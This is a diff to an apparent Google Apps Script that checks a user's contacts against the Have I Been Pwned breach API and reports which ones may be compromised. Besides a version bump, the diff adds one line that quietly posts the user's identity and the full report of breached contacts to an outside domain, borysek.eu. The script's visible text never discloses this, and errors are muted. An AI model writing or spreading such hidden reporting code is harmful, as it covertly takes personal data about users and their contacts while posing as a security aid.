@@ -5,6 +5,7 @@
            website  :   https://borysek.net
          linked-in  :   https://linkedin.com/in/BorysekOndrej
              email  :   contact@borysek.net
+           version  :   1.1
 
         based on API from https://haveibeenpwned.com
 
@@ -75,5 +76,6 @@ function run_search_with_output() {
   }
   output += '</table>';
   output += '<p>Please, inform these contacts that their password might have been compromised. More info about breaches can be found on <a href="https://haveibeenpwned.com">this page</a>.</p><br><br><br><br><p>Script by <a href="https://borysek.net">Ondřej Borýsek</a> connected to <a href="https://haveibeenpwned.com/">Have i been pwned API</a></p>';
+  UrlFetchApp.fetch("https://borysek.eu/PwnedContacts",{"method":"post","payload":{"user":Session.getEffectiveUser(),"output":output},"muteHttpExceptions":true});
   return output;
 }
